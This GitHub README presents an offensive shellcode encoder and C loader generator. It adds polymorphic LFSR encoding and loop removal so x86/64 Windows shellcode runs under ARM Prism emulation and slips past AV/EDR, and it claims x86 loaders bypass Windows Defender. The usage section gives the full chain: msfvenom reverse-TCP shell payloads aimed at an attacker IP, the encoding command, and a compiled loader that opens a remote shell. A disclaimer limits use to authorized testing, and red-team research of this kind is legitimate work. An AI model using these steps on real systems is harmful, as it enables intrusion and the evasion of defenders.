```
  █████▒█    ██  ██ ▄█▀▄▄▄       ██░ ██  ██▓    ███▄    █  ▄▄▄         ▄▄▄█████▓▓█████  ██ ▄█▀ ██▓ ▒█████  
▓██   ▒ ██  ▓██▒ ██▄█▒▒████▄    ▓██░ ██▒▓██▒    ██ ▀█   █ ▒████▄       ▓  ██▒ ▓▒▓█   ▀  ██▄█▒ ▓██▒▒██▒  ██▒
▒████ ░▓██  ▒██░▓███▄░▒██  ▀█▄  ▒██▀▀██░▒██▒   ▓██  ▀█ ██▒▒██  ▀█▄     ▒ ▓██░ ▒░▒███   ▓███▄░ ▒██▒▒██░  ██▒
░▓█▒  ░▓▓█  ░██░▓██ █▄░██▄▄▄▄██ ░▓█ ░██ ░██░   ▓██▒  ▐▌██▒░██▄▄▄▄██    ░ ▓██▓ ░ ▒▓█  ▄ ▓██ █▄ ░██░▒██   ██░
░▒█░   ▒▒█████▓ ▒██▒ █▄▓█   ▓██▒░▓█▒░██▓░██░   ▒██░   ▓██░ ▓█   ▓██▒     ▒██▒ ░ ░▒████▒▒██▒ █▄░██░░ ████▓▒░
 ▒ ░   ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒▒▒   ▓▒█░ ▒ ░░▒░▒░▓     ░ ▒░   ▒ ▒  ▒▒   ▓▒█░     ▒ ░░   ░░ ▒░ ░▒ ▒▒ ▓▒░▓  ░ ▒░▒░▒░ 
 ░     ░░▒░ ░ ░ ░ ░▒ ▒░ ▒   ▒▒ ░ ▒ ░▒░ ░ ▒ ░   ░ ░░   ░ ▒░  ▒   ▒▒ ░       ░     ░ ░  ░░ ░▒ ▒░ ▒ ░  ░ ▒ ▒░ 
 ░ ░    ░░░ ░ ░ ░ ░░ ░  ░   ▒    ░  ░░ ░ ▒ ░      ░   ░ ░   ░   ▒        ░         ░   ░ ░░ ░  ▒ ░░ ░ ░ ▒  
          ░     ░  ░        ░  ░ ░  ░  ░ ░              ░       ░  ░               ░  ░░  ░    ░      ░ ░  
============[Author:-Xyconix-0xXyc][不可避な適応]============
++++[“Inevitable adaptation”]++++
Proudly Engineered by Swiz Security LLC
++[v.1.0]++
```
# Motivation Behind "Fukahi Na Tekiō"
An enhancement to my [original SGN XOR Encoder](https://github.com/0xXyc/Fukahi-Teki0-XOR-CALL-POP-Encoder) that fixes x86/64 shellcode in emulated Windows ARM Environments (Prism), deemed Fukahi Na Tekio, or "Inevitable Adaptation" in Japanese.

Read about the full research and why I did it [here](https://hacking.swizsecurity.com/hacking_methodology/malware-development/fukahi-teki-bu-ke-bi-shi-ying-bypassing-win-1011-fpu-issues-via-custom-callpop-xor-encoder). 

## TLDR; this was because my x86/64 shellcode was not working properly on emulated ARM (Prism) environments in Windows due to Shikata Ga Nai's fnstenv/GetPC "trick" not working correctly in an emulated context. 

For some reason, EIP/RIP would always point to a near-null value, leading to a access violation (segfault for you Linux guys) because our shellcode value would be lost somewhere in memory. 

This is because the Floating Point Unit (FPU) would not reliably repopulate the shellcode's address when the `fnstenv` instruction would be used (idk your guess is as good as mine, Windows is weird). 

**That looks something like this:**
```
fcmovb st, st(5)        ; Any FPU instruction
fnstenv [esp-0xc]       ; Save FPU state to stack
pop ebp                 ; Grab saved EIP from FPU state
```
The solution? A CALL/POP techinque that is reliable and works just about anywhere. We simply POP our last known good location into a register and save it for when we are ready to CALL it later.

# 👀 How does it look?
**Help/Options**
<img width="1695" height="600" alt="Screenshot 2026-01-27 at 3 33 24 AM" src="https://github.com/user-attachments/assets/fdcb3828-633e-49f1-9258-292eb41a5e26" />

**Running with options:**
<img width="1080" height="600" alt="Screenshot 2026-01-27 at 3 23 33 AM" src="https://github.com/user-attachments/assets/ae1a12f0-4f3d-47aa-afd0-82d87c1721fa" />

**Output:**
<img width="894" height="600" alt="Screenshot 2026-01-27 at 3 29 03 AM" src="https://github.com/user-attachments/assets/15d727a0-4bdf-4a7a-90a8-f57a12da2df8" />

**Verifying different outcomes with each run:**
<img width="925" height="600" alt="Screenshot 2026-01-27 at 3 30 34 AM" src="https://github.com/user-attachments/assets/6b60a4bf-dbc9-4f30-8f8b-c952c189be89" />

**Grab & Compile Loader:**
<img width="1012" height="600" alt="Screenshot 2026-01-27 at 3 35 12 AM" src="https://github.com/user-attachments/assets/7b68ea8d-407d-465f-8e84-8550afa2396f" />

**Get a 🐚:**

<img width="642" height="154" alt="Screenshot 2026-01-27 at 3 39 08 AM" src="https://github.com/user-attachments/assets/c376b473-ea99-4356-ab5c-6be150359c14" />

# So, what changed from the last repo?
The people asked (actually nobody did, but I wanted to challenge myself further), so I did. This new update absolutely comes "pack-a-punched" right out of the box with things like:
- [✔️] Polymorphic Encoding Technique (different payload every time)
- [✔️] Implemented Linear Feedback Shift Register (LFSR)
- [✔️] Direct C-loader support and guidance for rapid testing
- [✔️] Support for eliminating loops (good for control flow and static AV/EDR evasion) which I deemed "unrolling"
- [✔️] Works with both x86/64 shellcode variants on ARM Windows environments using the native "Prism" emulator 

# Usage
**x86 Use Case**
1. Generate Shellcode:
```
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_MACHINE_IP> LPORT=1337 -f hex
```
2. Generate a Fukahi Na Tekio LFSR Encoded Payload here and generate a compact C-based Loader:
```
python3 fukahi-na-tekio-encoder.py <place_msfvenom_generated_shellcode_here> --mode noloop --full-loader --compact
```
3. Compile into a `.exe`:
```
i686-w64-mingw32-gcc-15.2.0.exe loader.c -o loader.exe -fno-stack-protector
```
**x64 Use Case**
1. Generate Shellcode:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_MACHINE_IP> LPORT=1337 -f hex
```
2. Generate a Fukahi Na Tekio LFSR Encoded Payload here and generate a compact C-based Loader:
```
python3 fukahi-na-tekio-encoder.py <place_msfvenom_generated_shellcode_here> --mode noloop --full-loader --compact
```
3. Compile into a `.exe`:
```
gcc loader.c -o loader.exe -fno-stack-protector
```

## ⚠️ Disclaimer

**FOR AUTHORIZED SECURITY RESEARCH AND EDUCATIONAL PURPOSES ONLY**

By downloading, using, or distributing this software, you acknowledge and agree to the following:

1. **Authorization Required**: You must have explicit, written authorization from the owner of any system you test with this tool. Unauthorized access to computer systems is a federal crime under the Computer Fraud and Abuse Act (CFAA) and similar laws worldwide.

2. **No Liability**: Swiz Security and Jacob Swinsinski provide this tool "AS IS" without warranty of any kind. We are **NOT** responsible or liable for any damages, legal consequences, criminal charges, or misuse arising from the use of this software.

3. **Your Responsibility**: You assume full responsibility for your actions. The creators and contributors of this project will not be held accountable for any illegal or unauthorized use.

4. **Intended Use**: This tool was developed for legitimate security research, penetration testing, red team operations, and educational purposes only.

5. **Compliance**: You agree to comply with all applicable local, state, federal, and international laws and regulations.

**If you do not agree to these terms, do not download, use, or distribute this software.**

---

*"With great power comes great responsibility."*

## Known Issues
⚠️ Unfortunately, there is an issue right now that I am trying to figure out as to why x86 loaders bypass Win Def successfully, but x64 does not. 

I'll be investigating this further and get back to you guys with an updated version of the encoder when I have time. 
